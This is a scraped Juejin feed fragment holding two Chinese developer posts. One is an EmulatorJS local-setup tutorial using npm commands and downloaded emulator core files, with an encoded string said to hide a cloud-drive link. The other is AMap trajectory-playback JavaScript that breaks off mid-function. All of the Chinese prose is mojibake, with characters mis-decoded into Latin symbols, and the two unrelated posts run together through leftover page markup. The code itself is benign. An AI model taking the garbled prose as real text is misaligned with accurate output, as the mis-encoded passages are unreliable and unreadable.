<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9ef326b74cf64d659c89fc062855d003~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449069&amp;x-signature=5TyBFvHre6xeoHecyb%2Bn5Yk9rrc%3D" alt="03.png" loading="lazy"/></p>
<h2 data-id="heading-1">å®‰è£…ä¾èµ–</h2>
<p>EmulatorJS ä»£ç ä¸‹è½½æˆåŠŸåï¼Œæ¥ä¸‹æ¥éœ€è¦ä½¿ç”¨ <code>npm</code> ä¸‹è½½ EmulatorJS é¡¹ç›®ç”¨åˆ°çš„ä¾èµ–æ–‡ä»¶ï¼ˆä¸€äº›å·¥å…·ç±»çš„ä»£ç ï¼‰ã€‚æ‰€ä»¥è¦å®‰è£…å¥½ Node.js ç¯å¢ƒã€‚</p>
<p>è£…å¥½ Node.js ç¯å¢ƒåï¼Œæ‰“å¼€ç»ˆç«¯ï¼Œè¿›å…¥åˆ° EmulatorJS é¡¹ç›®çš„ç›®å½•ã€‚</p>
<ul>
<li>åœ¨ç»ˆç«¯å¯ä»¥é€šè¿‡ <code>cs xxxxxx</code> çš„æ–¹å¼è¿›å…¥ EmulatorJSã€‚</li>
<li>åœ¨ Windows ä¹Ÿå¯ä»¥æ‰“å¼€ EmulatorJS æ–‡ä»¶å¤¹ï¼Œç„¶åå³é”®ï¼Œæ‰“å¼€ç»ˆç«¯ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/717fbe94d20b45dd9821c4a2be9dbf5d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449069&amp;x-signature=jfbLW33qbdV0sEoPppM42TgkltY%3D" alt="04.png" loading="lazy"/></p>
<p>æ‰“å¼€ç»ˆç«¯åï¼Œè¾“å…¥ä»¥ä¸‹ä»£ç å®‰è£… EmulatorJS çš„ä¾èµ–æ–‡ä»¶ã€‚</p>
<pre><code class="hljs language-css" lang="css">npm <span class="hljs-selector-tag">i</span>
</code></pre>
<p>å¦‚æœç½‘ç»œæ²¡é—®é¢˜çš„è¯ï¼Œå®‰è£…å¥½ä¾èµ–æ–‡ä»¶åï¼ŒEmulatorJS ç›®å½•ä¸‹ä¼šå‡ºç°ä¸€ä¸ª node_modules æ–‡ä»¶å¤¹ï¼Œé‡Œé¢å°±æ˜¯ EmulatorJS éœ€è¦ç”¨åˆ°çš„ä¾èµ–æ–‡ä»¶ã€‚</p>
<p>å…¶å®å®‰è£…å¥½ä¾èµ–åå°±å¯ä»¥è¿è¡Œ EmulatorJS äº†ï¼Œä½†å¦‚æœä½ æƒ³åœ¨â€œä¸è”ç½‘â€çš„æƒ…å†µä¸‹ä¹Ÿèƒ½è¿è¡Œ EmulatorJSï¼Œè¿˜éœ€è¦ä¸‹è½½æŒ‡å®šæ¨¡æ‹Ÿå™¨çš„æ–‡ä»¶ã€‚</p>
<p>æ¨¡æ‹Ÿå™¨æ–‡ä»¶åœ¨è¿™é‡Œï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fcdn.emulatorjs.org%2Fnightly%2Fdata%2Fcores" target="_blank" title="https://cdn.emulatorjs.org/nightly/data/cores" ref="nofollow noopener noreferrer">cdn.emulatorjs.org/nightly/datâ€¦</a></p>
<p>ä½ æƒ³è¿è¡Œå“ªå°æ¸¸æˆæœºï¼Œå°±ä¸‹è½½å¯¹åº”çš„æ–‡ä»¶ã€‚</p>
<p>æ¯”å¦‚æˆ‘æƒ³ç© GBAï¼Œé‚£å°±æœç´¢â€œgbaâ€ã€‚å¦‚æœè¦å…¼å®¹è€æµè§ˆå™¨ï¼Œé‚£å°±ä¸‹è½½ <code>xxx-legacy-wasm.data</code> è¿™ç±»æ–‡ä»¶ï¼Œå¦‚æœä½ ç”¨çš„æ˜¯æœ€æ–°ç‰ˆçš„ Chromeï¼Œç›´æ¥ä¸‹è½½ <code>mgba-wasm.data</code> ä¹Ÿè¡Œã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b3738f55be446a9a5e7905f900e1622~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449069&amp;x-signature=eEQBFigSyX9YKOEtN6YkeXKDUmA%3D" alt="05.png" loading="lazy"/></p>
<p>æŠŠæ¨¡æ‹Ÿå™¨æ–‡ä»¶æ”¾åˆ° EmulatorJS é¡¹ç›®çš„è¿™ä¸ªåœ°æ–¹ï¼Œä»¥åå°±å¯ä»¥ç¦»çº¿è¿è¡Œ EmulatorJS äº†ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">EmulatorJS/data/cores
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac28134f3dd94edc9f9c6303aece96ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449069&amp;x-signature=ARVcgSmScbc3gSPr25l6qONkfHk%3D" alt="06.png" loading="lazy"/></p>
<p>æˆ‘æƒ³ç© GBAï¼Œæ‰€ä»¥æˆ‘å°±åªæ”¾äº† <code>mgba-legacy-wasm.data</code> è¿›æ¥ã€‚</p>
<p>å¦‚æœæ— æ³•æ‰“å¼€æ¨¡æ‹Ÿå™¨æ–‡ä»¶çš„ç½‘å€ï¼Œæˆ‘ä¹Ÿå‡†å¤‡äº†ä¸€ä»½æ”¾åœ¨ç™¾æ¯’ç¢—ç›˜ã€‚</p>
<pre><code class="hljs">ğŸ±ï¼šå–µå–µå—¨å˜»å’ªå–µå‘€å‘¦å–µå–µå‘€å˜¤å’ªå–µå‘€å’ªå–µå’ªå‘€å“‡å’ªå’ªå“‡å“¼å–µå–µå–”å’å–µå–µå’•å˜¶å’ªå’ªå•Šå’ªå’ªå–µå˜¿å—·å–µå’ªå˜¿å’”å–µå–µå’•å’”å–µå–µå˜¿å’•å–µå–µå˜¿å‘œå’ªå’ªå—¨å—å–µå’ªå˜¿å‘¦å–µå–µå‘€å—¯å–µå’ªå’•å’”å’ªå–µå˜¿å“‡å’ªå–µå—¨å’å’ªå’ªå˜¿å“’å–µå–µå–”å˜¶å–µå–µå‘€å“‡å’ªå’ªå–”å’å’ªå’ªå“‡å‘œå’ªå’ªå—¯å‘€å–µå’ªå˜¤å˜Ÿå’ªå–µå˜¿å’å–µå’ªå‘¦å—¡å–µå–µå“ˆå“ˆå–µå–µå˜¤å“’å’ªå–µå•Šå“‡å–µå’ªå˜¿å˜¤å–µå’ªå˜›å–”å–µå–µå˜¤å’©å–µå’ªå˜¤å—¯å–µå’ªå˜¿å“’å’ªå’ªå˜¿å–”å’ªå’ªå˜¤å“‡å–µå’ªå˜¿å˜¤å’ªå–µå‘¦å•Šå–µå–µå‘¦å—¯å’ªå–µå˜¤å‘¦å–µå’ªå—¨å•ªå’ªå’ªå‘¦å–”å’ªå–µå—¨å’•å–µå–µå‘¦å‘œå’ªå’ªå“‡å’å’ªå–µå•Šå–µå–µå’ªå•Šå•Šå’ªå’ªå˜¿å˜¤å’ªå–µå“ˆå“’å–µå’ªå—¨å•Šå’ªå’ªå—¨å’•å–µå’ªå˜¿å—·å’ªå’ªå•Šå“¼
</code></pre>
<p>å¤åˆ¶ä¸Šé¢è¿™æ®µå†…å®¹ï¼Œåˆ°ã€Œå…‰åˆ»ç¬¦æ–‡ã€å°è½¯ä½“ï¼Œé€‰æ‹©â€œç¬¦æ–‡ - åœŸçŒ«â€è§£å¼€å§ã€‚ç›´æ¥å‘ç™¾æ¯’çš„ğŸ”—æ€•æŸäº›å¹³å°ä¸ç»™è¿‡ã€‚</p>
<h2 data-id="heading-2">è¿è¡Œ EmulatorJS</h2>
<p>å®‰è£…å¥½æ‰€æœ‰ä¾èµ–æ–‡ä»¶åï¼Œåœ¨ç»ˆç«¯è¾“å…¥è¿™æ¡å‘½ä»¤æŒ‰å›è½¦é”®å°±å¯ä»¥è¿è¡Œ EmulatorJS äº†ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">npm run start
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9350e9b928714718ac8b7866c5c31370~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449069&amp;x-signature=Pz7ycMaZ8npZrMsj8FQFKK0jqKc%3D" alt="07.png" loading="lazy"/></p>
<p>æŠŠæ¸¸æˆæ‹–è¿›å»å°±å¯ä»¥ç›´æ¥è¿è¡Œäº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0845218fe00a47c69756cce64e171af8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449069&amp;x-signature=Nnld5xMYdFFDFODmIjGIgsR5J8k%3D" alt="08.png" loading="lazy"/></p>
<p>ä»¥ GBA ä¸ºä¾‹ï¼Œå¯ä»¥éšæ—¶ä¿å­˜å’Œè¯»å–æ¸¸æˆè¿›åº¦ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b6b9637072d4968a1650478ec0f73b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449069&amp;x-signature=t35SR7L62g3HWqgmZ7Wk8MkOms4%3D" alt="09.png" loading="lazy"/></p>
<p>å…¶ä»–åŠŸèƒ½å°±ä¸å¤šä»‹ç»äº†ï¼Œè‡ªå·±ç ”ç©¶å§ï½</p>
<hr/>
<p><strong>ç‚¹èµ + å…³æ³¨ + æ”¶è— = å­¦ä¼šäº†</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é«˜å¾·è½¨è¿¹æ›´æ–°æ•ˆæœ]]></title>    <link>https://juejin.cn/post/7596934200580669476</link>    <guid>https://juejin.cn/post/7596934200580669476</guid>    <pubDate>2026-01-19T17:45:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596934200580669476" data-draft-id="7596896373054128191" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é«˜å¾·è½¨è¿¹æ›´æ–°æ•ˆæœ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-19T17:45:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ¢¦é£å›"/> <meta itemprop="url" content="https://juejin.cn/user/3804726432118366"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é«˜å¾·è½¨è¿¹æ›´æ–°æ•ˆæœ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3804726432118366/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ¢¦é£å›
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T17:45:41.000Z" title="Mon Jan 19 2026 17:45:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>é«˜å¾·è½¨è¿¹æ›´æ–°æ•ˆæœ</strong></h2>
<p>åŸºäºé«˜å¾·åœ°å›¾ JSAPI 2.0 å¼€å‘çš„è½¨è¿¹å›æ”¾ç³»ç»Ÿï¼Œæ”¯æŒå®æ—¶è½¨è¿¹ç‚¹åŠ è½½ã€å¹³æ»‘åŠ¨ç”»æ’­æ”¾ã€è½¨è¿¹å¯è§†åŒ–ç­‰åŠŸèƒ½ã€‚</p>
<h2 data-id="heading-1">ä¸»è¦åŠŸèƒ½</h2>
<ul>
<li>ğŸ¯ <strong>è½¨è¿¹å›æ”¾åŠ¨ç”»</strong> - å¹³æ»‘çš„ç§»åŠ¨åŠ¨ç”»ï¼Œè‡ªåŠ¨æ—‹è½¬ï¼Œåœ°å›¾è·Ÿéš</li>
</ul>
<h6 data-id="heading-2">å›¾ç‰‡æ•ˆæœ</h6>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef0b52ad148348acaf34394d2182ef49~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qKm6aOe5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449543&amp;x-signature=qz1WUlqVGCzY2l1ZlfeTyQvInUo%3D" alt="b3ab5f25-768e-4df0-b3d9-3616ba53dd00.png" loading="lazy"/></p>
<p>ä»£ç é™„ä¸Šï¼š</p>
<pre><code class="hljs language-js" lang="js">&lt;!doctype html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;meta charset="utf-8"&gt;
    &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt;
    &lt;meta name="viewport" content="initial-scale=1.0, user-scalable=no, width=device-width"&gt;
    &lt;title&gt;è½¨è¿¹å›æ”¾&lt;/title&gt;
    &lt;link rel="stylesheet" href="https://a.amap.com/jsapi_demos/static/demo-center/css/demo-center.css"/&gt;
    &lt;style&gt;
        html, body, #container {
            height: 100%;
            width: 100%;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div id="container"&gt;&lt;/div&gt;
&lt;script type="text/javascript" src="https://webapi.amap.com/maps?v=2.0&amp;key=YOUR_API_KEY"&gt;&lt;/script&gt;
&lt;script&gt;
    // JSAPI2.0 ä½¿ç”¨è¦†ç›–ç‰©åŠ¨ç”»å¿…é¡»å…ˆåŠ è½½åŠ¨ç”»æ’ä»¶
    AMap.plugin('AMap.MoveAnimation', function(){
        // å®Œæ•´çš„è½¨è¿¹ç‚¹æ•°æ®ï¼ˆæ¨¡æ‹Ÿè¿œç¨‹æ•°æ®æºï¼‰
        var allTrajectoryPoints = [
            [116.478935,39.997761],
            [116.478939,39.997825],
            [116.478912,39.998549],
            [116.478912,39.998549],
            [116.478998,39.998555],
            [116.478998,39.998555],
            [116.479282,39.99856],
            [116.479658,39.998528],
            [116.480151,39.998453],
            [116.480784,39.998302],
            [116.480784,39.998302],
            [116.481149,39.998184],
            [116.481573,39.997997],
            [116.481863,39.997846],
            [116.482072,39.997718],
            [116.482362,39.997718],
            [116.483633,39.998935],
            [116.48367,39.998968],
            [116.484648,39.999861]
        ];

        var marker;
        var currentPath = []; // å½“å‰å·²åŠ è½½çš„è½¨è¿¹ç‚¹
        var loadedIndex = 0; // å·²åŠ è½½çš„è½¨è¿¹ç‚¹ç´¢å¼•
        var batchSize = 3; // æ¯æ¬¡åŠ è½½çš„è½¨è¿¹ç‚¹æ•°é‡
        var loadInterval = null; // å®šæ—¶å™¨
        var isAnimating = false; // æ ‡è®°æ˜¯å¦æ­£åœ¨åŠ¨ç”»ä¸­

        var map = new AMap.Map("container", {
            resizeEnable: true,
            center: [116.397428, 39.90923],
            zoom: 17
        });

        marker = new AMap.Marker({
            map: map,
            position: allTrajectoryPoints[0],
            icon: "https://a.amap.com/jsapi_demos/static/demo-center-v2/car.png",
            offset: new AMap.Pixel(-13, -26),
        });

        // åªä¿ç•™å·²èµ°è¿‡è½¨è¿¹çº¿
        var passedPolyline = new AMap.Polyline({
            map: map,
            strokeColor: "#FF8000",  //çº¿é¢œè‰²
            strokeWeight: 6,      //çº¿å®½
        });

        // ç»´æŠ¤ä¸€ä¸ªç´¯ç§¯çš„å·²èµ°è¿‡è·¯å¾„æ•°ç»„ï¼Œç¡®ä¿è½¨è¿¹çº¿ä¸€ç›´æ˜¾ç¤º
        var accumulatedPassedPath = [allTrajectoryPoints[0]];
        var lastRecordedPosition = allTrajectoryPoints[0]; // ä¸Šæ¬¡è®°å½•çš„ä½ç½®

        // åˆå§‹åŒ–æ—¶è®¾ç½®å·²èµ°è¿‡è½¨è¿¹ä¸ºèµ·ç‚¹
        passedPolyline.setPath(accumulatedPassedPath);
        currentPath.push(allTrajectoryPoints[0]);
        loadedIndex = 1;

        marker.on('moving', function (e) {
            // è·å–å½“å‰markerçš„ä½ç½®
            var currentPos = e.target.getPosition();
            var currentPosArray = [currentPos.lng, currentPos.lat];
            
            // è®¡ç®—ä¸ä¸Šæ¬¡è®°å½•ä½ç½®çš„è·ç¦»
            var dist = Math.sqrt(
                Math.pow(currentPosArray[0] - lastRecordedPosition[0], 2) + 
                Math.pow(currentPosArray[1] - lastRecordedPosition[1], 2)
            );
            
            // å¦‚æœç§»åŠ¨è·ç¦»è¶…è¿‡é˜ˆå€¼ï¼ˆé¿å…é‡å¤æ·»åŠ å¤ªè¿‘çš„ç‚¹ï¼‰ï¼Œæ·»åŠ åˆ°ç´¯ç§¯è·¯å¾„
            if (dist &gt; 0.00001) {
                accumulatedPassedPath.push(currentPosArray);
                lastRecordedPosition = currentPosArray;
                
                // æ›´æ–°è½¨è¿¹çº¿æ˜¾ç¤º
                passedPolyline.setPath(accumulatedPassedPath);
            }
            
            map.setCenter(currentPos, true);
        });

        marker.on('moveend', function(e) {
            isAnimating = false;
            // ç¡®ä¿æœ€åä¸€ä¸ªä½ç½®è¢«è®°å½•
            var finalPos = e.target.getPosition();
            var finalPosArray = [finalPos.lng, finalPos.lat];
            
            // æ£€æŸ¥æœ€åä¸€ä¸ªä½ç½®æ˜¯å¦å·²ç»è®°å½•
            var lastPoint = accumulatedPassedPath[accumulatedPassedPath.length - 1];
            var dist = Math.sqrt(
                Math.pow(finalPosArray[0] - lastPoint[0], 2) + 
                Math.pow(finalPosArray[1] - lastPoint[1], 2)
            );
            
            if (dist &gt; 0.00001) {
                accumulatedPassedPath.push(finalPosArray);
                passedPolyline.setPath(accumulatedPassedPath);
            }
            
            lastRecordedPosition = finalPosArray;
        });

        // æ¨¡æ‹Ÿè¿œç¨‹åŠ è½½è½¨è¿¹ç‚¹çš„å‡½æ•°
        function loadTrajectoryPoints() {
            if (loadedIndex &gt;= allTrajectoryPoints.length) {
                // æ‰€æœ‰è½¨è¿¹ç‚¹å·²åŠ è½½å®Œæˆï¼Œæ¸…é™¤å®šæ—¶å™¨
                if (loadInterval) {
                    clearInterval(loadInterval);
                    loadInterval = null;
                }
                console.log('æ‰€æœ‰è½¨è¿¹ç‚¹å·²åŠ è½½å®Œæˆ');
                return;
            }

            // è®¡ç®—æœ¬æ¬¡è¦åŠ è½½çš„è½¨è¿¹ç‚¹
            var newPoints = [];
            var endIndex = Math.min(loadedIndex + batchSize, allTrajectoryPoints.length);
            
            for (var i = loadedIndex; i &lt; endIndex; i++) {
                newPoints.push(allTrajectoryPoints[i]);
            }

            console.log('åŠ è½½æ–°çš„è½¨è¿¹ç‚¹:', newPoints);
            
            // å°†æ–°ç‚¹æ·»åŠ åˆ°å½“å‰è·¯å¾„
            currentPath = currentPath.concat(newPoints);
            loadedIndex = endIndex;

            // è·å–markerå½“å‰ä½ç½®
            var currentPosition = marker.getPosition();
            var currentPosArray = [currentPosition.lng, currentPosition.lat];
            
            // å¦‚æœmarkeræ­£åœ¨ç§»åŠ¨ï¼Œéœ€è¦æš‚åœå¹¶é‡æ–°è§„åˆ’è·¯å¾„
            if (isAnimating) {
                marker.pauseMove();
                
                // æ‰¾åˆ°å½“å‰ä½ç½®åœ¨currentPathä¸­æœ€æ¥è¿‘çš„ç‚¹ç´¢å¼•
                var closestIndex = 0;
                var minDist = Infinity;
                for (var k = 0; k &lt; currentPath.length; k++) {
                    var dist = Math.sqrt(
                        Math.pow(currentPath[k][0] - currentPosition.lng, 2) + 
                        Math.pow(currentPath[k][1] - currentPosition.lat, 2)
                    );
                    if (dist &lt; minDist) {
                        minDist = dist;
                        closestIndex = k;
                    }
                }
                
                // æ„å»ºä»å½“å‰ä½ç½®å¼€å§‹çš„æ–°è·¯å¾„
                // å¦‚æœå½“å‰ä½ç½®ä¸åœ¨è·¯å¾„ç‚¹ä¸Šï¼Œå…ˆæ·»åŠ å½“å‰ä½ç½®
                var newPath = [];
                if (minDist &gt; 0.0001) {
                    newPath.push(currentPosArray);
                }
                
                // æ·»åŠ ä»æœ€è¿‘ç‚¹ä¹‹åçš„æ‰€æœ‰ç‚¹ï¼ˆåŒ…æ‹¬æ–°åŠ è½½çš„ç‚¹ï¼‰
                for (var m = closestIndex + 1; m &lt; currentPath.length; m++) {
                    newPath.push(currentPath[m]);
                }
                
                // å¦‚æœè¿˜æœ‰å‰©ä½™è·¯å¾„ï¼Œç»§ç»­ç§»åŠ¨
                if (newPath.length &gt; 0) {
                    isAnimating = true;
                    marker.moveAlong(newPath, {
                        duration: 500,
                        autoRotation: true,
                    });
                }
            } else {
                // å¦‚æœmarkeræ²¡æœ‰åœ¨ç§»åŠ¨ï¼Œæ‰¾åˆ°å½“å‰ä½ç½®åœ¨è·¯å¾„ä¸­çš„ä½ç½®ï¼Œä»é‚£é‡Œç»§ç»­
                var startPath = [];
                var foundIndex = -1;
                
                // æŸ¥æ‰¾å½“å‰ä½ç½®åœ¨è·¯å¾„ä¸­çš„ä½ç½®
                for (var n = 0; n &lt; currentPath.length; n++) {
                    var dist = Math.sqrt(
                        Math.pow(currentPath[n][0] - currentPosition.lng, 2) + 
                        Math.pow(currentPath[n][1] - currentPosition.lat, 2)
                    );
                    if (dist &lt; 0.0001) {
                        foundIndex = n;
                        break;
                    }
                }
                
                if (foundIndex &gt;= 0 &amp;&amp; foundIndex &lt; currentPath.length - 1) {
                    // ä»æ‰¾åˆ°çš„ä½ç½®ä¹‹åå¼€å§‹
                    startPath = currentPath.slice(foundIndex + 1);
                } else if (foundIndex === -1) {
                    // å¦‚æœæ²¡æ‰¾åˆ°ï¼Œä»å½“å‰ä½ç½®å¼€å§‹ï¼ŒåŒ…å«æ‰€æœ‰å‰©ä½™ç‚¹
                    startPath = [currentPosArray].concat(currentPath.slice(1));
                } else {
                    // å·²ç»åœ¨æœ€åä¸€ä¸ªç‚¹ï¼Œä½¿ç”¨æ–°åŠ è½½çš„ç‚¹
                    startPath = currentPath.slice(-newPoints.length);
                }
                
                if (startPath.length &gt; 0) {
                    isAnimating = true;
                    marker.moveAlong(startPath, {
                        duration: 500,
                        autoRotation: true,
                    });
                }
            }
        }

        // ç¡®ä¿åœ°å›¾æ¸²æŸ“å®Œæˆåå†å¼€å§‹ç§»åŠ¨åŠ¨ç”»
        map.on('complete', function() {
            console.log('åœ°å›¾æ¸²æŸ“å®Œæˆï¼Œå¼€å§‹åŠ è½½è½¨è¿¹ç‚¹');
            
            // åŠ è½½ç¬¬ä¸€æ‰¹æ•°æ®
            var firstBatch = [];
            var firstEndIndex = Math.min(loadedIndex + batchSize, allTrajectoryPoints.length);
            for (var i = loadedIndex; i &lt; firstEndIndex; i++) {
                firstBatch.push(allTrajectoryPoints[i]);
            }
            currentPath = currentPath.concat(firstBatch);
            loadedIndex = firstEndIndex;
            console.log('åŠ è½½ç¬¬ä¸€æ‰¹è½¨è¿¹ç‚¹:', firstBatch);
            
